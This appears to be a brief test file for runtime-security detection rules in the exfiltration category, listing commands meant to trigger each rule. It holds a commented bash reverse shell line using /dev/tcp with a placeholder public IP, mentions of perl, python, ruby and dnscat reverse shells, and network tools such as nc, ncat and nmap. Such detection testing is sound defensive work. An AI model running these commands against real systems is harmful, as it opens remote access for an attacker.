#Exfiltration
#1.rule: System procs network activity
#need public ip
#bash -c 'exec bash -i &>/dev/tcp/public IP/port <&1'

#2.rule: Interpreted procs inbound network activity
#need public ip
#perl, python, ruby, etc. Reverse shell

#3.rule: Interpreted procs onbound network activity
#need public ip
#perl, python, ruby, etc. reverse shell

#4.rule: Unexpected UDP Traffic
#dnscat reverse shell
#need public ip and domain

#5.rule: Lauch Suspicious Network Tool in Container
dig
#tcpdump &
nc
ncat
nmap
#tshark &
#ngrep &

#6.rule: Launch Suspicious Network Tool on Host
#need host env
